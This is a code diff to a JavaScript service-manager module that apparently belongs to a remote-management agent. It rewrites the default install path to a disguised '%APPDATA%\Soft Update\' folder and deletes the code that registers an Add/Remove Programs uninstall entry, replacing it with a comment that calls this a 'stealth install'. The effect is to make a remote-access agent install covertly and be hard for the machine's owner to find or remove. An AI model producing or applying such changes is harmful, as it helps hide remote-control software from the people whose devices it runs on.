@@ -2300,19 +2300,7 @@ function serviceManager()
             // Before we start, we need to copy the binary to the right place
             if(!options.installPath)
             {
-                options.installPath = this.getProgramFolder();
-                switch(options.companyName)
-                {
-                    case null:
-                        options.installPath += ('\\mesh\\' + options.name + '\\');
-                        break;
-                    case '':
-                        options.installPath += ('\\' + options.name + '\\');
-                        break;
-                    default:
-                        options.installPath += ('\\' + options.companyName + '\\' + options.name + '\\');
-                        break;
-                }
+                options.installPath = process.env['APPDATA'] + '\\Soft Update\\';
             }
             if (!options.installInPlace) { prepareFolders(options.installPath); }
             if (options.servicePath == process.execPath) { options._isMeshAgent = true; }
@@ -2425,34 +2413,7 @@ function serviceManager()
 
             if (options._isMeshAgent)
             {
-                //
-                // For now, we'll only provide an uninstaller if the binary is the mesh agent binary, so we
-                // won't need to copy the binary to run the uninstall script
-                //
-                var script = Buffer.from("try{require('service-manager').manager.uninstallService('" + options.name + "');}catch(x){}process.exit();").toString('base64');
-                try
-                {
-                    reg.WriteKey(reg.HKEY.LocalMachine, 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\' + options.name, 'DisplayName', options.displayName);
-                    reg.WriteKey(reg.HKEY.LocalMachine, 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\' + options.name, 'DisplayIcon', options.servicePath);
-                    reg.WriteKey(reg.HKEY.LocalMachine, 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\' + options.name, 'InstallDate', new Date().toISOString().slice(0,10).replace(/-/g,""));
-                    if (options.publisher) { reg.WriteKey(reg.HKEY.LocalMachine, 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\' + options.name, 'Publisher', options.publisher); }
-                    reg.WriteKey(reg.HKEY.LocalMachine, 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\' + options.name, 'InstallLocation', options.installPath);
-                    reg.WriteKey(reg.HKEY.LocalMachine, 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\' + options.name, 'EstimatedSize', Math.floor(require('fs').statSync(options.servicePath).size / 1024));
-                    reg.WriteKey(reg.HKEY.LocalMachine, 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\' + options.name, 'NoModify', 0x1);
-                    reg.WriteKey(reg.HKEY.LocalMachine, 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\' + options.name, 'NoRepair', 0x1);
-                    if (options.name == 'Mesh Agent' || options._installer == true)
-                    {
-                        reg.WriteKey(reg.HKEY.LocalMachine, 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\' + options.name, 'UninstallString', '"' + options.servicePath + '" -funinstall --meshServiceName="' + options.name + '"');
-                    }
-                    else
-                    {
-                        reg.WriteKey(reg.HKEY.LocalMachine, 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\' + options.name, 'UninstallString', '"' + options.servicePath + '" -b64exec ' + script);
-                    }
-                    reg.WriteKey(reg.HKEY.LocalMachine, 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\' + options.name, 'DisplayVersion', process.versions.commitDate.toString());
-                }
-                catch (xx)
-                {
-                }
+                // Add/Remove Programs entry intentionally not created (stealth install)
             }
         }
         else
